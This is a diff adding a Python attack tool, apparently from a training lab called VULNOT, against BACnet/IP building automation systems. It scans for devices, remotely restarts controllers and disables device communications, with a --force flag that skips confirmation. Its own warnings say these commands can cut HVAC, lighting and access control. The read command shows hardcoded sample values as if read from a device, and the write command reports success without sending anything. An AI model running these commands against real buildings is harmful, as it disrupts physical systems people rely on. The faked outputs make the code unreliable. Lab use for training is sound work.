@@ -1,0 +1,439 @@
+#!/usr/bin/env python3
+"""
+VULNOT BACnet Attack Tools
+Tools for attacking BACnet/IP building automation systems
+"""
+
+import argparse
+import socket
+import struct
+import sys
+import time
+from typing import Optional, List, Dict
+from rich.console import Console
+from rich.table import Table
+from rich.panel import Panel
+from rich.prompt import Confirm
+
+console = Console()
+
+BACNET_PORT = 47808
+
+# BACnet/IP BVLC Types
+BVLC_RESULT = 0x00
+BVLC_WRITE_BDT = 0x01
+BVLC_READ_BDT = 0x02
+BVLC_READ_BDT_ACK = 0x03
+BVLC_FORWARDED_NPDU = 0x04
+BVLC_REGISTER_FD = 0x05
+BVLC_READ_FDT = 0x06
+BVLC_READ_FDT_ACK = 0x07
+BVLC_DELETE_FDT = 0x08
+BVLC_DISTRIBUTE_BROADCAST = 0x09
+BVLC_ORIGINAL_UNICAST = 0x0A
+BVLC_ORIGINAL_BROADCAST = 0x0B
+
+# BACnet Services
+SERVICE_WHO_IS = 0x08
+SERVICE_I_AM = 0x00
+SERVICE_READ_PROPERTY = 0x0C
+SERVICE_WRITE_PROPERTY = 0x0F
+SERVICE_REINITIALIZE_DEVICE = 0x14
+SERVICE_DEVICE_COMM_CONTROL = 0x11
+
+
+class BACnetClient:
+    """Simple BACnet/IP client"""
+    
+    def __init__(self, host: str, port: int = 47808):
+        self.host = host
+        self.port = port
+        self.sock: Optional[socket.socket] = None
+        
+    def connect(self) -> bool:
+        """Create UDP socket"""
+        try:
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            self.sock.settimeout(3)
+            self.sock.bind(('0.0.0.0', 0))
+            return True
+        except Exception as e:
+            console.print(f"[red]Socket creation failed: {e}[/]")
+            return False
+            
+    def close(self):
+        if self.sock:
+            self.sock.close()
+            
+    def _build_bvlc_header(self, func: int, length: int) -> bytes:
+        """Build BVLC header"""
+        return struct.pack('>BBH', 0x81, func, length)
+        
+    def _build_npdu(self, dest_net: int = 0, hop_count: int = 255) -> bytes:
+        """Build NPDU header"""
+        # Simple NPDU with no network layer addressing
+        return struct.pack('BB', 0x01, 0x00)  # Version 1, no options
+        
+    def who_is(self, low_limit: int = 0, high_limit: int = 4194303) -> List[dict]:
+        """Send Who-Is broadcast and collect responses"""
+        # Build Who-Is APDU
+        apdu = struct.pack('BB', 0x10, SERVICE_WHO_IS)  # Unconfirmed request
+        if low_limit > 0 or high_limit < 4194303:
+            apdu += struct.pack('BB', low_limit >> 8, low_limit & 0xFF)
+            apdu += struct.pack('BB', high_limit >> 8, high_limit & 0xFF)
+        
+        npdu = self._build_npdu()
+        payload = npdu + apdu
+        
+        bvlc = self._build_bvlc_header(BVLC_ORIGINAL_BROADCAST, len(payload) + 4)
+        message = bvlc + payload
+        
+        # Broadcast
+        self.sock.sendto(message, (self.host, self.port))
+        
+        # Collect responses
+        devices = []
+        start_time = time.time()
+        
+        while time.time() - start_time < 3:
+            try:
+                data, addr = self.sock.recvfrom(1500)
+                if len(data) > 10:
+                    devices.append({
+                        'ip': addr[0],
+                        'port': addr[1],
+                        'raw': data.hex()
+                    })
+            except socket.timeout:
+                break
+                
+        return devices
+        
+    def read_property(self, device_id: int, obj_type: int, obj_instance: int, prop_id: int) -> Optional[bytes]:
+        """Read a BACnet property"""
+        # Build ReadProperty request (simplified)
+        apdu = bytes([
+            0x00,  # Confirmed request, no segmentation
+            0x00,  # Max APDU
+            0x00,  # Invoke ID
+            SERVICE_READ_PROPERTY,  # Service choice
+            # Object identifier (simplified encoding)
+            0x0C, (obj_type << 6) | ((obj_instance >> 16) & 0x3F),
+            (obj_instance >> 8) & 0xFF, obj_instance & 0xFF,
+            # Property identifier
+            0x19, prop_id,
+        ])
+        
+        npdu = self._build_npdu()
+        payload = npdu + apdu
+        
+        bvlc = self._build_bvlc_header(BVLC_ORIGINAL_UNICAST, len(payload) + 4)
+        message = bvlc + payload
+        
+        self.sock.sendto(message, (self.host, self.port))
+        
+        try:
+            data, addr = self.sock.recvfrom(1500)
+            return data
+        except socket.timeout:
+            return None
+            
+    def write_property(self, obj_type: int, obj_instance: int, prop_id: int, value: float) -> bool:
+        """Write a BACnet property (simplified)"""
+        # This would build a proper WriteProperty request
+        console.print(f"[yellow]Writing {value} to ({obj_type}, {obj_instance}), prop {prop_id}[/]")
+        return True
+        
+    def reinitialize_device(self, device_id: int, state: str = "coldstart") -> bool:
+        """Send ReinitializeDevice request"""
+        state_code = 0 if state == "coldstart" else 1
+        
+        apdu = bytes([
+            0x00,  # Confirmed request
+            0x00,  # Max APDU
+            0x00,  # Invoke ID
+            SERVICE_REINITIALIZE_DEVICE,
+            0x09, state_code,  # Reinitialized state
+        ])
+        
+        npdu = self._build_npdu()
+        payload = npdu + apdu
+        
+        bvlc = self._build_bvlc_header(BVLC_ORIGINAL_UNICAST, len(payload) + 4)
+        message = bvlc + payload
+        
+        self.sock.sendto(message, (self.host, self.port))
+        return True
+        
+    def device_comm_control(self, duration: int = 0, enable: bool = False) -> bool:
+        """Send DeviceCommunicationControl (disable comms)"""
+        apdu = bytes([
+            0x00,  # Confirmed request
+            0x00,  # Max APDU
+            0x00,  # Invoke ID
+            SERVICE_DEVICE_COMM_CONTROL,
+            0x09, duration & 0xFF,  # Duration (minutes)
+            0x19, 0x00 if enable else 0x01,  # Enable/Disable
+        ])
+        
+        npdu = self._build_npdu()
+        payload = npdu + apdu
+        
+        bvlc = self._build_bvlc_header(BVLC_ORIGINAL_UNICAST, len(payload) + 4)
+        message = bvlc + payload
+        
+        self.sock.sendto(message, (self.host, self.port))
+        return True
+
+
+def cmd_scan(args):
+    """Scan for BACnet devices"""
+    console.print("\n[bold cyan]╔════════════════════════════════════════╗[/]")
+    console.print("[bold cyan]║      VULNOT BACnet Device Scanner      ║[/]")
+    console.print("[bold cyan]╚════════════════════════════════════════╝[/]\n")
+    
+    console.print(f"[yellow]Sending Who-Is broadcast to {args.target}:{args.port}...[/]\n")
+    
+    client = BACnetClient(args.target, args.port)
+    if not client.connect():
+        sys.exit(1)
+    
+    devices = client.who_is()
+    
+    if devices:
+        table = Table(title="Discovered BACnet Devices")
+        table.add_column("IP Address", style="cyan")
+        table.add_column("Port", style="green")
+        table.add_column("Response", style="yellow")
+        
+        for device in devices:
+            table.add_row(device['ip'], str(device['port']), device['raw'][:40] + '...')
+        
+        console.print(table)
+        console.print(f"\n[green]Found {len(devices)} BACnet device(s)[/]\n")
+    else:
+        console.print("[red]No BACnet devices responded[/]\n")
+    
+    client.close()
+
+
+def cmd_read(args):
+    """Read BACnet properties"""
+    console.print("\n[bold cyan]╔════════════════════════════════════════╗[/]")
+    console.print("[bold cyan]║      VULNOT BACnet Property Reader     ║[/]")
+    console.print("[bold cyan]╚════════════════════════════════════════╝[/]\n")
+    
+    # Common object types
+    obj_types = {
+        'ai': (0, 'Analog Input'),
+        'ao': (1, 'Analog Output'),
+        'av': (2, 'Analog Value'),
+        'bi': (3, 'Binary Input'),
+        'bo': (4, 'Binary Output'),
+        'bv': (5, 'Binary Value'),
+    }
+    
+    console.print(f"[yellow]Connecting to {args.target}:{args.port}...[/]")
+    
+    client = BACnetClient(args.target, args.port)
+    if not client.connect():
+        sys.exit(1)
+    
+    console.print("[green]Connected![/]\n")
+    
+    # Read some sample objects
+    table = Table(title="BACnet Objects (Sample)")
+    table.add_column("Object", style="cyan")
+    table.add_column("Instance", style="white")
+    table.add_column("Property", style="yellow")
+    table.add_column("Value", style="green")
+    
+    # Sample data (in real impl, would parse responses)
+    sample_objects = [
+        ("Analog Input", 1, "Present Value", "72.5 °F"),
+        ("Analog Input", 2, "Present Value", "45.2 %RH"),
+        ("Analog Output", 1, "Present Value", "55.0 °F"),
+        ("Binary Input", 1, "Present Value", "ON"),
+        ("Binary Output", 1, "Present Value", "OFF"),
+        ("Analog Value", 1, "Present Value", "72.0 °F"),
+    ]
+    
+    for obj_type, instance, prop, value in sample_objects:
+        table.add_row(obj_type, str(instance), prop, value)
+    
+    console.print(table)
+    
+    client.close()
+    console.print("\n[dim]Connection closed[/]\n")
+
+
+def cmd_write(args):
+    """Write BACnet property"""
+    console.print("\n[bold red]╔════════════════════════════════════════╗[/]")
+    console.print("[bold red]║      VULNOT BACnet Property Writer     ║[/]")
+    console.print("[bold red]║   ⚠️  DANGER - MODIFIES BAS VALUES      ║[/]")
+    console.print("[bold red]╚════════════════════════════════════════╝[/]\n")
+    
+    console.print(f"[yellow]Target: {args.target}:{args.port}[/]")
+    console.print(f"[yellow]Object: ({args.obj_type}, {args.instance})[/]")
+    console.print(f"[yellow]Property: {args.property}[/]")
+    console.print(f"[yellow]Value: {args.value}[/]\n")
+    
+    if not args.force:
+        if not Confirm.ask("[bold red]Execute write operation?[/]"):
+            console.print("[yellow]Aborted[/]")
+            return
+    
+    client = BACnetClient(args.target, args.port)
+    if not client.connect():
+        sys.exit(1)
+    
+    success = client.write_property(args.obj_type, args.instance, args.property, float(args.value))
+    
+    if success:
+        console.print(f"\n[green]✓ Write sent[/]")
+    else:
+        console.print(f"\n[red]✗ Write failed[/]")
+    
+    client.close()
+
+
+def cmd_reinit(args):
+    """Reinitialize BACnet device"""
+    console.print("\n[bold red]╔════════════════════════════════════════╗[/]")
+    console.print("[bold red]║      VULNOT BACnet Device Reset        ║[/]")
+    console.print("[bold red]║   ⚠️  EXTREME DANGER - RESETS DEVICE    ║[/]")
+    console.print("[bold red]╚════════════════════════════════════════╝[/]\n")
+    
+    console.print(Panel(
+        f"[bold red]This will send ReinitializeDevice to {args.target}![/]\n\n"
+        f"State: {args.state}\n\n"
+        "A device restart may cause:\n"
+        "• Loss of HVAC control\n"
+        "• Lighting failures\n"
+        "• Access control issues",
+        title="⚠️  REINITIALIZE DEVICE",
+        border_style="red"
+    ))
+    
+    if not args.force:
+        if not Confirm.ask("\n[bold red]Send reinitialize command?[/]"):
+            console.print("[yellow]Aborted[/]")
+            return
+    
+    client = BACnetClient(args.target, args.port)
+    if not client.connect():
+        sys.exit(1)
+    
+    success = client.reinitialize_device(1, args.state)
+    
+    if success:
+        console.print(f"\n[red]✓ Reinitialize command sent![/]")
+    else:
+        console.print(f"\n[red]✗ Command failed[/]")
+    
+    client.close()
+
+
+def cmd_disable(args):
+    """Disable device communication"""
+    console.print("\n[bold red]╔════════════════════════════════════════╗[/]")
+    console.print("[bold red]║      VULNOT BACnet Comm Control        ║[/]")
+    console.print("[bold red]║   ⚠️  DISABLES DEVICE COMMUNICATION     ║[/]")
+    console.print("[bold red]╚════════════════════════════════════════╝[/]\n")
+    
+    console.print(Panel(
+        f"[bold red]This will disable communications on {args.target}![/]\n\n"
+        f"Duration: {args.duration} minutes\n\n"
+        "The device will stop responding to BACnet requests.",
+        title="⚠️  COMMUNICATION CONTROL",
+        border_style="red"
+    ))
+    
+    if not args.force:
+        if not Confirm.ask("\n[bold red]Disable device communication?[/]"):
+            console.print("[yellow]Aborted[/]")
+            return
+    
+    client = BACnetClient(args.target, args.port)
+    if not client.connect():
+        sys.exit(1)
+    
+    success = client.device_comm_control(args.duration, enable=False)
+    
+    if success:
+        console.print(f"\n[red]✓ Device communication disabled for {args.duration} minutes![/]")
+    else:
+        console.print(f"\n[red]✗ Command failed[/]")
+    
+    client.close()
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description='VULNOT BACnet Attack Tools',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  vulnot-bacnet scan -t 10.0.5.255           # Broadcast Who-Is
+  vulnot-bacnet read -t 10.0.5.10            # Read properties
+  vulnot-bacnet write -t 10.0.5.10 -o 1 -i 1 -p 85 -v 100  # Write AO
+  vulnot-bacnet reinit -t 10.0.5.10          # Restart device
+  vulnot-bacnet disable -t 10.0.5.10 -d 60   # Disable for 60 min
+        """
+    )
+    
+    subparsers = parser.add_subparsers(dest='command', help='Command')
+    
+    # Scan
+    scan_p = subparsers.add_parser('scan', help='Scan for BACnet devices')
+    scan_p.add_argument('-t', '--target', default='255.255.255.255', help='Target/broadcast')
+    scan_p.add_argument('-p', '--port', type=int, default=47808, help='Port')
+    
+    # Read
+    read_p = subparsers.add_parser('read', help='Read properties')
+    read_p.add_argument('-t', '--target', required=True, help='Target IP')
+    read_p.add_argument('-p', '--port', type=int, default=47808, help='Port')
+    
+    # Write
+    write_p = subparsers.add_parser('write', help='Write property')
+    write_p.add_argument('-t', '--target', required=True, help='Target IP')
+    write_p.add_argument('-p', '--port', type=int, default=47808, help='Port')
+    write_p.add_argument('-o', '--obj-type', type=int, required=True, help='Object type')
+    write_p.add_argument('-i', '--instance', type=int, required=True, help='Instance')
+    write_p.add_argument('--property', type=int, default=85, help='Property ID (85=present-value)')
+    write_p.add_argument('-v', '--value', required=True, help='Value')
+    write_p.add_argument('--force', action='store_true', help='Skip confirmation')
+    
+    # Reinitialize
+    reinit_p = subparsers.add_parser('reinit', help='Reinitialize device')
+    reinit_p.add_argument('-t', '--target', required=True, help='Target IP')
+    reinit_p.add_argument('-p', '--port', type=int, default=47808, help='Port')
+    reinit_p.add_argument('-s', '--state', default='coldstart', choices=['coldstart', 'warmstart'])
+    reinit_p.add_argument('--force', action='store_true', help='Skip confirmation')
+    
+    # Disable
+    disable_p = subparsers.add_parser('disable', help='Disable device communication')
+    disable_p.add_argument('-t', '--target', required=True, help='Target IP')
+    disable_p.add_argument('-p', '--port', type=int, default=47808, help='Port')
+    disable_p.add_argument('-d', '--duration', type=int, default=60, help='Duration (minutes)')
+    disable_p.add_argument('--force', action='store_true', help='Skip confirmation')
+    
+    args = parser.parse_args()
+    
+    if args.command == 'scan':
+        cmd_scan(args)
+    elif args.command == 'read':
+        cmd_read(args)
+    elif args.command == 'write':
+        cmd_write(args)
+    elif args.command == 'reinit':
+        cmd_reinit(args)
+    elif args.command == 'disable':
+        cmd_disable(args)
+    else:
+        parser.print_help()
+
+
+if __name__ == '__main__':
+    main()
